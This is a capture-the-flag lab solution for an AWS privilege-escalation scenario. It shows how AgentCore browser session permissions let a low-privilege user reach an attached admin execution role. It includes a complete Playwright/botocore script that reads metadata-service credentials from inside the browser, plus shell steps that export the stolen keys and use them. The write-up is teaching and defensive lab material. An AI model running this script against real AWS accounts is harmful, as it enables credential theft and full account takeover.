# Solution: AgentCore Custom Browser CDP Credential Theft to Admin

The bedrock-007 scenario exploits a privilege escalation path that emerges when an IAM principal holds `bedrock-agentcore:StartBrowserSession` and `bedrock-agentcore:ConnectBrowserAutomationStream` on an account that already has a Custom Browser running with a privileged execution role attached. A Bedrock AgentCore Custom Browser is an AWS-managed headless Chromium instance running inside a Firecracker MicroVM. When provisioned with an execution role, AWS assumes that role on behalf of the browser and continuously refreshes the resulting temporary credentials inside the MicroVM via the MicroVM Metadata Service (MMDS) — the same endpoint pattern as EC2 IMDSv2 at `169.254.169.254`.

What makes this variant especially dangerous is that the attacker never needs `iam:PassRole` and never creates any new AWS infrastructure. The privileged browser already exists; the only requirement is the ability to start a session on it and connect to its Chrome DevTools Protocol (CDP) stream. From there, Playwright's `context.route()` API can intercept and rewrite the IMDSv2 token request — a PUT that `fetch()` cannot issue by itself from inside the browser's JavaScript sandbox — and then `page.evaluate()` makes the MMDS calls that return the execution role's live credentials.

This is the "existing-passrole" analogue to the bedrock-006 new-passrole Browser path. In bedrock-006, the attacker creates the browser and chooses which role to attach. Here, the browser is already in place and already carrying a sensitive role. The attack surface is therefore any account where at least one Custom Browser has an elevated execution role and where `StartBrowserSession` / `ConnectBrowserAutomationStream` permissions have been granted broadly — a pattern that appears naturally in teams building web-browsing agents for agentic AI workflows.

## The Challenge

You start as `pl-prod-bedrock-007-to-admin-starting-user`, an IAM user with a narrow set of permissions. You have `bedrock-agentcore:StartBrowserSession` and `bedrock-agentcore:ConnectBrowserAutomationStream` on all resources, plus the helpful pair `bedrock-agentcore:ListBrowsers` and `bedrock-agentcore:GetBrowser` for reconnaissance. You have no `iam:PassRole`, no browser-creation permissions, and no ability to take any other privileged action in the account.

Your goal is to obtain credentials for `pl-prod-bedrock-007-to-admin-target-role`, an IAM role with `AdministratorAccess` that trusts `bedrock-agentcore.amazonaws.com` as a service principal. That role is already attached to `pl-prod-bedrock-007-to-admin-victim-browser` — a Custom Browser provisioned by Terraform. Your task is to get the credentials that AWS has been continuously vending into that browser's MicroVM.

Set up your starting credentials:

```bash
export AWS_ACCESS_KEY_ID=<starting_user_access_key_id>
export AWS_SECRET_ACCESS_KEY=<starting_user_secret_access_key>
unset AWS_SESSION_TOKEN

aws sts get-caller-identity
# arn:aws:iam::{account_id}:user/pl-prod-bedrock-007-to-admin-starting-user
```

Confirm you do not have admin access yet:

```bash
aws iam list-users --max-items 1
# AccessDenied
```

Good. No admin access yet.

## Reconnaissance

Use `bedrock-agentcore:ListBrowsers` to discover Custom Browsers in the account:

```bash
aws bedrock-agentcore-control list-browsers \
  --query 'browserSummaries[*].{Name:name,Id:browserId,Status:status}' \
  --output table
```

You will see `pl-prod-bedrock-007-to-admin-victim-browser` in READY state. Store its ID:

```bash
BROWSER_ID=$(aws bedrock-agentcore-control list-browsers \
  --query 'browserSummaries[?contains(name, `bedrock-007`)].browserId' \
  --output text)
echo "Browser ID: $BROWSER_ID"
```

Now use `bedrock-agentcore:GetBrowser` to confirm the execution role is attached:

```bash
aws bedrock-agentcore-control get-browser \
  --browser-id "$BROWSER_ID" \
  --query '{Status:status,ExecutionRole:executionRoleArn}'
```

The output will show the `executionRoleArn` pointing to `pl-prod-bedrock-007-to-admin-target-role`. This confirms the browser is in READY state and is vending admin credentials via MMDS. Note the short role name — you will need it when constructing the MMDS credentials path:

```bash
TARGET_ROLE_NAME="pl-prod-bedrock-007-to-admin-target-role"
```

## Exploitation

The attack has three stages: start a browser session, connect to the CDP stream, then use Playwright's route interception to read credentials from MMDS via JavaScript `fetch()` calls.

### Stage 1: Start the Browser Session

Call `bedrock-agentcore:StartBrowserSession` to open a session against the existing browser. This returns a `sessionId` and the CDP WebSocket URL in `streams.automationStream.streamEndpoint`:

```bash
SESSION_RESPONSE=$(aws bedrock-agentcore start-browser-session \
  --browser-identifier "$BROWSER_ID" \
  --output json)

SESSION_ID=$(echo "$SESSION_RESPONSE" | jq -r '.sessionId')
CDP_URL=$(echo "$SESSION_RESPONSE" | jq -r '.streams.automationStream.streamEndpoint')
echo "Session ID: $SESSION_ID"
echo "CDP URL: $CDP_URL"
```

`bedrock-agentcore:ConnectBrowserAutomationStream` is the IAM permission AWS checks when Playwright authenticates the WebSocket upgrade (via SigV4 signed headers). It is not a separate API call — the URL returned by `StartBrowserSession` is used directly.

### Stage 2: Extract MMDS Credentials via Playwright

The CDP WebSocket endpoint requires SigV4 authentication — `bedrock-agentcore:ConnectBrowserAutomationStream` is checked on the WebSocket upgrade request. Playwright's `connect_over_cdp` accepts extra headers, so sign the connection using `botocore`:

Two additional constraints shape the extraction approach:
- `fetch()` from `page.evaluate()` is blocked by Chrome's Private Network Access (PNA) policy for link-local addresses (`169.254.x.x`). Use `page.goto()` navigations instead — navigation requests bypass PNA.
- IMDSv2 requires a PUT to `/latest/api/token`. A `page.goto()` issues a GET, so a `context.route()` handler rewrites it to PUT before the request leaves the browser.

Write and run the extraction script:

```python
# /tmp/extract_bedrock_007_creds.py
import sys, json, os
from urllib.parse import urlparse
from botocore.auth import SigV4Auth
from botocore.awsrequest import AWSRequest
from botocore.credentials import Credentials
from playwright.sync_api import sync_playwright

BROWSER_ID, AWS_REGION, WS_URL = sys.argv[1], sys.argv[2], sys.argv[3]
MMDS_TOKEN_URL = "http://169.254.169.254/latest/api/token"
MMDS_CREDS_URL = "http://169.254.169.254/latest/meta-data/iam/security-credentials"

creds = Credentials(os.environ['AWS_ACCESS_KEY_ID'], os.environ['AWS_SECRET_ACCESS_KEY'],
                    os.environ.get('AWS_SESSION_TOKEN'))
signing_url = WS_URL.replace('wss://', 'https://')
req = AWSRequest(method='GET', url=signing_url, headers={'host': urlparse(signing_url).hostname})
SigV4Auth(creds, 'bedrock-agentcore', AWS_REGION).add_auth(req)
signed_headers = dict(req.headers)

state = {'token': None}

def handle_mmds_route(route, request):
    if request.url == MMDS_TOKEN_URL:
        route.continue_(method="PUT", headers={**dict(request.headers),
                        "X-aws-ec2-metadata-token-ttl-seconds": "60"})
    elif state['token']:
        route.continue_(headers={**dict(request.headers),
                        "X-aws-ec2-metadata-token": state['token']})
    else:
        route.continue_()

with sync_playwright() as p:
    browser = p.chromium.connect_over_cdp(WS_URL, headers=signed_headers)
    ctx = browser.new_context()
    ctx.route("http://169.254.169.254/**", handle_mmds_route)
    page = ctx.new_page()

    state['token'] = page.goto(MMDS_TOKEN_URL, wait_until="commit").text().strip()
    role_name = page.goto(f"{MMDS_CREDS_URL}/", wait_until="commit").text().strip()
    creds_text = page.goto(f"{MMDS_CREDS_URL}/{role_name}", wait_until="commit").text()
    browser.close()

print(creds_text)
```

Run it:

```bash
CREDS=$(python3 /tmp/extract_bedrock_007_creds.py "$BROWSER_ID" "$AWS_REGION" "$CDP_URL")
echo "$CREDS" | python3 -c "import json,sys; d=json.load(sys.stdin); print('AccessKeyId:', d['AccessKeyId'])"
```

The MMDS endpoint returns a familiar IMDSv2 credentials JSON:

```json
{
  "Code": "Success",
  "LastUpdated": "...",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "..."
}
```

Export the credentials:

```bash
export AWS_ACCESS_KEY_ID=$(echo "$CREDS" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d['AccessKeyId'])")
export AWS_SECRET_ACCESS_KEY=$(echo "$CREDS" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d['SecretAccessKey'])")
export AWS_SESSION_TOKEN=$(echo "$CREDS" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d['Token'])")
```

## Verification

Confirm you are now operating as the admin role:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:sts::{account_id}:assumed-role/pl-prod-bedrock-007-to-admin-target-role/...
```

Verify administrator access by performing an action your original user could not:

```bash
aws iam list-users --max-items 3 --output table
# Returns a table of IAM users — you now have full admin access
```

## Capture the Flag

With admin credentials active, read the CTF flag from SSM Parameter Store. `AdministratorAccess` grants `ssm:GetParameter` on all parameters in the account, including the flag at `/pathfinding-labs/flags/bedrock-007-to-admin`. You are using the credentials exfiltrated from the MicroVM here — not reverting to your original starting user:

```bash
aws ssm get-parameter \
  --name /pathfinding-labs/flags/bedrock-007-to-admin \
  --query 'Parameter.Value' \
  --output text
```

The value printed is your scenario-specific flag. The `AdministratorAccess` policy attached to `pl-prod-bedrock-007-to-admin-target-role` gives it implicit permission to call `ssm:GetParameter` on any parameter in the account, so no additional policy configuration is needed.

## What Happened

You started with a low-privilege IAM user that could do nothing administrative — two narrow AgentCore permissions on an already-running browser were the only tools available. By starting a session on a Custom Browser that someone else had provisioned with an admin role, connecting to its CDP stream, and exploiting Playwright's request interception layer to satisfy IMDSv2's PUT requirement from inside the browser's JavaScript sandbox, you extracted live AWS temporary credentials for `AdministratorAccess`.

The critical distinction from the new-passrole browser variant (bedrock-006) is that this path requires no `iam:PassRole` and creates no new AWS resources. The attack surface is entirely read-side: the dangerous configuration is a pre-existing Custom Browser with an elevated execution role, not the act of creating one. This means the risk is invisible to any control plane that only monitors `iam:PassRole` usage or resource creation events.

The `context.route()` trick is the novel element compared to other MMDS credential theft scenarios. In EC2, Lambda, and AgentCore Runtime attacks, the attacker runs shell commands directly on the host and issues a `curl -X PUT` to satisfy IMDSv2. Inside a browser's JavaScript sandbox, `fetch()` cannot issue arbitrary-method cross-origin requests. Playwright's CDP-layer interception bypasses this constraint at a level the browser's own security policies cannot see. This technique will generalize to any future AWS service that provides CDP or WebSocket-based scripting access to a browser process running with an execution role.

In real environments this pattern appears wherever teams have deployed agentic AI workflows that need a managed browser — web scraping pipelines, AI research assistants, automated QA agents. The execution role often has broad data-plane permissions because the browsing agent needs to call other AWS services. Granting `StartBrowserSession` / `ConnectBrowserAutomationStream` broadly — for example, to all developers who work on the agent pipeline — quietly hands any of those developers the ability to assume the execution role. The mental model "it's just controlling a browser" understates what CDP access actually means when the browser is running inside an AWS-managed compute environment with attached IAM credentials.
